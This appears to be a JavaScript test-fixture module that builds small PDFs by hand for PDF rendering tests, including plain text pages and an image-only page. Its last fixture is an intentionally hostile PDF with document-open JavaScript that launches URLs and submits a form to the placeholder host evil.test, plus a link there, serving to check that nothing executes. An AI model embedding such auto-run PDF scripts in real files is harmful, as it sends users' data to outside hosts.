// Tiny PDFs written by hand for the pdf tests (test/pdf-node.mjs, test/pdf-browser.mjs).
// Each object body is a string (latin1, so image bytes pass through); obj 1 is the catalog.
export function makePdf(objects, { info } = {}) {
  const parts = ['%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'], offsets = [];
  let len = Buffer.byteLength(parts[0], 'latin1');
  const all = info ? [...objects, info] : objects;
  all.forEach((body, i) => {
    const s = `${i + 1} 0 obj\n${body}\nendobj\n`;
    offsets.push(len); parts.push(s); len += Buffer.byteLength(s, 'latin1');
  });
  const xref = `xref\n0 ${all.length + 1}\n0000000000 65535 f \n` + offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('');
  parts.push(xref + `trailer\n<< /Size ${all.length + 1} /Root 1 0 R${info ? ` /Info ${all.length} 0 R` : ''} >>\nstartxref\n${len}\n%%EOF\n`);
  return new Uint8Array(Buffer.from(parts.join(''), 'latin1'));
}
const stream = (s, extra = '') => `<< /Length ${Buffer.byteLength(s, 'latin1')}${extra} >>\nstream\n${s}\nendstream`;
const textPage = (parent, contents, font) => `<< /Type /Page /Parent ${parent} 0 R /MediaBox [0 0 612 792] /Contents ${contents} 0 R /Resources << /Font << /F1 ${font} 0 R >> >> >>`;
const say = (...lines) => stream('BT /F1 24 Tf 72 700 Td 28 TL ' + lines.map((l) => `(${l}) Tj T*`).join(' ') + ' ET');
const HELV = '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>';

// Three pages of Helvetica text (a standard font, so rendering uses standard_fonts from data.pack).
export const textPdf = () => makePdf([
  '<< /Type /Catalog /Pages 2 0 R >>',
  '<< /Type /Pages /Kids [3 0 R 5 0 R 7 0 R] /Count 3 >>',
  textPage(2, 4, 9), say('Hello page one', 'Second line'),
  textPage(2, 6, 9), say('Deadline: May 3'),
  textPage(2, 8, 9), say('Page three ends here'),
  HELV,
], { info: '<< /Title (Pouch fixture) /Author (BayLeaf tests) /CreationDate (D:20261101120000Z) >>' });

// Page 1 text, page 2 a red image and no text at all (like a scan).
const RED = Buffer.from([255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0]).toString('latin1');
export const scanPdf = () => makePdf([
  '<< /Type /Catalog /Pages 2 0 R >>',
  '<< /Type /Pages /Kids [3 0 R 5 0 R] /Count 2 >>',
  textPage(2, 4, 8), say('Cover page'),
  '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 6 0 R /Resources << /XObject << /Im1 7 0 R >> >> >>',
  stream('q 612 0 0 792 0 0 cm /Im1 Do Q'),
  stream(RED, ' /Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceRGB /BitsPerComponent 8'),
  HELV,
]);

// Hostile: document-open JavaScript and a link that would reach evil.test if anything ran or followed them.
export const EVIL = 'http://evil.test';
export const jsPdf = () => makePdf([
  `<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(boot) 7 0 R] >> >> >>`,
  '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
  `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> /Annots [8 0 R] >>`,
  say('Nothing runs here'),
  HELV,
  `<< /S /JavaScript /JS (app.launchURL\\("${EVIL}/openaction"\\); this.submitForm\\("${EVIL}/submit"\\);) >>`,
  `<< /S /JavaScript /JS (app.launchURL\\("${EVIL}/names"\\);) >>`,
  `<< /Type /Annot /Subtype /Link /Rect [72 690 300 730] /A << /S /URI /URI (${EVIL}/link) >> >>`,
]);
